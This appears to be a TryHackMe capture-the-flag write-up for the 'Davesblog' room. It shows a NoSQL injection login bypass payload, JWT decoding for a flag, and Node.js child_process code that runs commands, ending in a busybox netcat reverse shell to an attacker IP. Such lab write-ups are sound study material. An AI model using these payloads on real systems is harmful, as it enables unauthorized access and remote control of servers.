<h3> Davesblog TryHackMe </h3>

Difficulty = Hard

Nmap Scan:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fe08f1e1-1816-4a36-8e3c-a5a65985d426)

Checking the web server shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e4d01c87-c206-417e-9cfa-1ec50bf94091)

From looking at the web app server builtins we can see this

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/699e3b64-a912-42dc-9981-f07f4bac6a09)

This tells us that the web server is running on Express which is basically NodeJS and also the db is NoSQL

Checking the /admin directory shows a login page
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f349a68b-2136-4aa8-af74-9e247ae4a70e)

Since we don't currently know any cred to use lets try NoSQLi 

I used [this](https://book.hacktricks.xyz/pentesting-web/nosql-injection) to get my payload to be:

```json
{"username": {"$ne": null}, "password": {"$ne": null} }
```

And remember the *Content-Type* should be set to *application/json*

Trying that bypasses the login form
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/046e84e9-57e8-481b-89f1-08b9b76bed54)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/66883af2-ca6e-41be-af4a-263eecd1a4de)

A new cookie is formed and its a jwt token 

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a7d75288-15ec-4e23-8793-f0cf70640399)

Using [jwt.io](https://jwt.io/) I decoded the jwt token and got the first flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e97c9fe-1ad5-4a1a-883b-59e50e80d435)

There's a place which claims to be executing system commands but when i try execute normal commands it doesn't work
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/70d80988-4740-4c49-bbb8-0db576988e65)

Since we know that the web server is build on NodeJs lets execute a NodeJS command
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/98e7ddae-13d6-4554-9f14-c20c612adf99)

```js
(() => { return require("child_process").execSync("whoami;", { timeout: 5000 }); })();
```

Now lets get shell :D

```js
(() => { return require("child_process").execSync("busybox nc 10.2.42.156 1337 -e /bin/bash;", { timeout: 5000 }); })();
```

To stabilize the shell
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/79634295-3ecd-410c-932c-543f9a59b040)



